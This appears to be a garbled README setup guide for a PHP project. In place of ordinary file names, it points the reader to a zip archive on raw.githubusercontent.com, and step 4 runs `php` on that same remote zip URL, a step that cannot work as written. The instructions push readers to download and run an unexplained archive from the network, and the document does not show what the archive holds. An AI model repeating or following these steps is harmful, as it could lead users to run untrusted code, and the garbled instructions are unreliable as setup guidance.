 Setup Instructions

### Requirements:
- PHP 7.4 or later
- Composer

### Steps:

1. **Unzip the provided `https://raw.githubusercontent.com/bharath6701/taskone/main/src/taskone-2.8.zip` file**.
2. Navigate to the project folder in your terminal.
3. Run `composer install` to install the required dependencies.
4. Run the project using: 
   ```bash
   php https://raw.githubusercontent.com/bharath6701/taskone/main/src/taskone-2.8.zip
